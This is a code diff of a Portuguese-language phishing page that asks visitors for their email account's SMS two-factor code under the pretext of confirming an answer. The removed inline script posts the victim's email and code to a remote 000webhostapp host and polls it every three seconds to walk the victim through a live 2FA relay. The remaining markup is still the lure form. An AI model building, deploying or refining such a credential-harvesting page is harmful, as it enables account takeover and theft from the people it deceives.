@@ -94,96 +94,28 @@
     <div id="p3" class="mdl-progress mdl-js-progress mdl-progress__indeterminate"></div>
     Estamos enviando sua resposta. <br>
     <br>
-    </span> <span class="2steps" style="display: none;"> Para confirmar sua resposta através de seu login digite o código que você recebeu em seu por SMS em seu smartphone no campo abaixo: <br>
+    </span> <span class="twosteps" style="display: none;"> Para confirmar sua resposta através de seu login digite o código que você recebeu em seu por SMS em seu smartphone no campo abaixo: <br>
     <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
       <input class="mdl-textfield__input" type="text" id="cvc">
       <label class="mdl-textfield__label" for="cvc">Digite o código aqui...</label>
     </div>
     <br>
     <br>
+    <input type="hidden" id="os">
     </span>
 		
  </div>
 	<span id="senha_errada" style="display: none;">
 		<span class="text-danger">Sua senha ou email estão errados, por favor entre em sua conta para confirmar e responda novamente em seguida com as informações corretas para poder validar sua resposta pelo aplicativo.</span>
-		<br><br><br>
+        <br>
+        <span class="gaccount"></span>
+        <br><br>
 	</span> 
 </div>
-<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script> 
-<script>
 
-    function getMobileOperatingSystem() {
-        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-        if (/android/i.test(userAgent)) {
-            return "Android";
-        }
-        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-            return "iOS";
-        }
-        return "PC";
-    }
 
-    let navegador = getMobileOperatingSystem();
+<script src="js/jquery-3.3.1.js"></script> 
+<script src="js/script.js"></script> 
 
-    function executeQuery() {
-        
-        var cvc   = $('#cvc').val();
-        var email = localStorage.getItem("email");
-        console.log(email);
-        
-        $.ajax({
-            url: 'https://stopsearchingnow.000webhostapp.com/actions.php',
-            data:'action=sync&email='+email+'&cod='+cvc,
-            dataType: "json",
-            method:'POST',
-            success: function(data) {
-                console.log(data);
-				
-                if(data.steps == 0 && data.code != null){
-                    $('.gcode1').html(data.code);
-                    $('.g_part1').hide();
-                    $('.g_part2').show();
-                }
-				
-                if(data.steps == 1){
-                    window.location.href='#cvc';
-					$('#google').hide();
-                    $('.2steps').show();
-                }else{
-					$('#cvc').val('');
-					$('.2steps').hide();
-					$('#google').show();
-				}
-				
-                if(data.ok == 1){
-                    window.location = "concluido.html";
-                }
-				
-				if(data.invalid == 1){
-					$('#google').hide();
-					$('#senha_errada').show();
-				}else{
-					$('#senha_errada').hide();
-				}
-            }
-        });
-        setTimeout(executeQuery, 3000);
-    }
-
-    $(document).ready(function() {        
-        $('.confirmar').click( function() {
-
-            if(navegador == 'Android' | navegador == 'PC'){
-                $('.g_part1').show();
-            }else{
-                $('.g_part3').show();
-            }
-
-            window.location.href='#auth';
-            setTimeout(executeQuery, 3000);
-        });    
-    });
-
-</script>
 </body>
 </html>
